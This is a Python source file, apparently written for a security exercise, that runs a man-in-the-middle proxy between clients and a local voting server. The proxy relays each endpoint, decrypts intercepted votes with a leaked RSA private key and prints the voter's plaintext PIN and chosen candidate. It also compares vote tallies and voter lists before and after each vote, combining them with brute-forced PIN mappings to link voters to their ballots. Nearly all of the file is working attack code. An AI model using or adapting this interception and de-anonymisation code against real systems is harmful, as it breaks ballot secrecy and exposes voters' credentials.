
## COPY OF IMPLEMENTED CLIENT IMPORTS
import requests
from requests import Response
''' redundant with server imports:
from pydantic import BaseModel
import rsa
import base64
import json
'''
# COPY OF SERVER IMPORTS
import uvicorn
import json
from fastapi import FastAPI, status, Request
from fastapi.responses import Response
import rsa
import csv
''' unused:
#import base64
#from hashlib import sha256
#from pydantic import BaseModel
#from pathlib import Path
#from starlette.responses import JSONResponse
'''
# NEW IMPORTS
import asyncio
from concurrent.futures import ThreadPoolExecutor
import bruteForce



#load leaked private key for man in the middle attack
with open("private.pem", "rb") as f:
    priv_key = rsa.PrivateKey.load_pkcs1(f.read())

# this is us
app = FastAPI()
# !!! this should be changed to 8000 at the end
PORT = 8001


# in order to talk to the server we need it's address
SERVER_ADDR = "127.0.0.2"
# !!! this should be changed to 8001 at the end
SERVER_PORT = "8000"
SERVER_URL = f"http://{SERVER_ADDR}:{SERVER_PORT}"


#################################
#### for being the middleman ####
#################################

# appears to work fully
@app.get("/candidates")
def get_candidates():
    response = requests.get(url=f"{SERVER_URL}/candidates")
    
    return Response(status_code=status.HTTP_200_OK, content=response.content)

# appears to work fully
@app.get("/validate_votes")
def validate_votes_endpoint():
    
    response = requests.get(url=f"{SERVER_URL}/validate_votes")

    return Response(status_code=status.HTTP_200_OK, content=response.content)


# appears to work well enough 
# does not fully account for failure methods, but those shouldn't come up, and we'll be faking them eventually anyways
@app.post("/deauthorize")
async def deauthorize_pin_endpoint(request: Request):
    # gets the data field from the client's request so we can pretend to be the client
    encrypted_ID = await request.body()
    # ask the server for the client's request
    response = requests.post(url=f"{SERVER_URL}/deauthorize", data=encrypted_ID, headers={'Content-Type': 'application/octet-stream'})

    return Response(status_code=status.HTTP_200_OK, content=json.dumps({"message": "PIN Deauthorized!"}))



# appears to work fully
@app.post("/authorize")
async def authorize_pin_endpoint(request: Request):

    # gets the data field from the client's request so we can pretend to be the client
    encrypted_ID = await request.body()
    # ask the server for the client's request
    response = requests.post(url=f"{SERVER_URL}/authorize", data=encrypted_ID, headers={'Content-Type': 'application/octet-stream'})


    # respond to the client as the server
    if response.status_code == 200:
        return Response(status_code=status.HTTP_200_OK, content=json.dumps({"message": "PIN Authorized!"}))
    elif response.status_code == 400:
        return Response(status_code=status.HTTP_400_BAD_REQUEST, content=response.content)
    else:
        return Response(status_code=status.HTTP_400_BAD_REQUEST, content=json.dumps({"message": "Unknown error occurred, please try again!"}))


# appears to work fully - added snooping
@app.post("/vote")
async def vote_endpoint(request: Request):
    #intercepting payload
    encrypted_vote = await request.body()

    '''attack 1(?) -> compare before/after vote'''
    votes1, pins1 = extract_data()
    ''''''


    ''' attack 2(?) -> leaked Private Key'''
    #decrypt the payload using the leaked private key
    try:
        decrypted_vote = rsa.decrypt(encrypted_vote, priv_key)
        vote_data = json.loads(decrypted_vote)
        print(f"\nBreach")
        print(f"Intercepted Plaintext PIN: {vote_data['PIN']}")
        print(f"Intercepted Vote For: {vote_data['Vote']}\n")
    except Exception as e:
        print(f"Failed to decrypt intercepted payload: {e}")
    ''''''


    # forward original encrypted payload to real server
    response = requests.post(url=f"{SERVER_URL}/vote", data=encrypted_vote, headers={'Content-Type': 'application/octet-stream'})


    '''attack 1(?) continued -> compare before/after vote'''
    votes2, pins2 = extract_data()

    # make sure you have good data before continuing
    if response.status_code == 200:
        this_vote = unmaskVote(votes1, votes2, pins1, pins2)

        # candidate = 0 is the error return state for unmaskVote, so don't log that as an input
        if this_vote[1] != 0:
            known_votes.append(this_vote)
    ''''''


    #Return the exact response back to the client
    if response.status_code == 401:
        return Response(status_code=status.HTTP_401_UNAUTHORIZED)
    elif response.status_code == 403:
        return Response(status_code=status.HTTP_403_FORBIDDEN)
    elif response.status_code == 200:
        return Response(status_code=status.HTTP_200_OK)
    else:
        return Response(status_code=status.HTTP_400_BAD_REQUEST)


##############################
#### for isolating a vote ####
##############################

global pins_known

pins_known = False

unknown_votes = []

known_votes = []

leaked_IDs = {}


### helper function pulled directly from client
def get_res(res: Response):
    try:
        return res.json()
    except requests.exceptions.JSONDecodeError:
        return None

### helper function modified from server
## returns the list of pins that have voted
def voted_pins():

    # this function can be modified if we need to switch from a CSV to a sqlite database or smth else
    output = []
    with open("votes.csv", mode='r') as db_file:
        csv_reader = csv.DictReader(db_file)
        for entry in csv_reader:
            if entry['PIN'] != '':
                output.append(entry['PIN'])

    return output

# asks the server for the election data
# returns a list of the current candidate tallies, and a list of who has voted
# [candidate tallies] , [voter PINs]
def extract_data():

    voter_pins = voted_pins()

    candidate_tallies = []

    response = requests.get(url=f"{SERVER_URL}/validate_votes")
    
    response_text = get_res(response)
    
    if not response_text:
        print("No candidates with votes returned from server!")
        return
    
    #print(response_text)
    
    data = json.loads(response_text)
    
    for entry in data.keys():
        #entry_name = "# of valid pins voted" if entry == "num_pins" else entry

        if entry != "num_pins":
            candidate_tallies.append(data[entry])

    return candidate_tallies , voter_pins
        
## returns [unhashed pin, candidate]
def unmaskVote(votes1, votes2, pins1, pins2):

    if pins_known:

        ##################
        # find who voted #
        ##################

        # remove all the pins that are in pins1 from pins2
        for temp_pin in pins1:
            pins2.remove(temp_pin)
        # if there is more than one pin left, return nothing and throw an error
        if len(pins2) != 1:
            print("bruteforce: incorrect number of votes registered, cannot find the voter")
            return ["0",0]
        ## now we know there is only one pin in pins2
        pin = pins2[0]

        # the valid pins are known, so we can search through the leaked PIN/IDs
        # this is who cast the last vote
        unhashed_pin = leaked_IDs[pin]


        ###########################
        # find who they voted for #
        ###########################

        candidate = 0

        # go through the candidates
        for i in range(len(votes1)):

            # subtract how many votes each candidate had before this last vote
            # from how many they have now
            votes2[i] -= votes1[i]

            # if they aren't equal, that was the selected candidate
            if votes2[i] != 0:
                candidate = i+1
                # returns the (unhashed) ID, and their respective candidate
                print (f"bruteforce: voter with PIN #{unhashed_pin} voted for candidate {candidate}.")

                ### !!!
                ### this is who cast the last vote and who they voted for
                ### !!!
                return [unhashed_pin, candidate]

        # if all of them were equal, something went wrong
        print("bruteforce: could not find a difference between before and after the vote")
        return ["0", 0]

    else:
        print("bruteforce: pins not known yet")
        unknown_votes.append([votes1, votes2, pins1, pins2])
        return ["0", 0]


def unmaskVotes():
    for vote in unknown_votes:
        
        this_vote = unmaskVote(vote[0], vote[1], vote[2], vote[3])

        # candidate = 0 is the error return state for unmaskVote, so don't log that as an input
        if this_vote[1] != 0:
            known_votes.append(this_vote)



def runServer():

    print(f"[i] Started server on port {PORT}")

    uvicorn.run(app, host="0.0.0.0", port=PORT)

async def getPins():

    global pins_known

    await bruteForce.getKeys(leaked_IDs)

    pins_known = True

    print("bruteforce: pins are known!")

    unmaskVotes()

async def main():

    loop = asyncio.get_running_loop()

    with ThreadPoolExecutor() as pool:
        blocking_future = loop.run_in_executor(pool, runServer)

        await asyncio.gather(
            getPins(),
            blocking_future
        )

###############################################
#### what happens when we atart the server ####
###############################################

if __name__ == "__main__":

    #print(f"[i] Started server on port {PORT}")

    #asyncio.run(bruteForce.getKeys(leaked_IDs)) 

    #print(leaked_IDs)

    #uvicorn.run(app, host="0.0.0.0", port=PORT)

    asyncio.run(main())

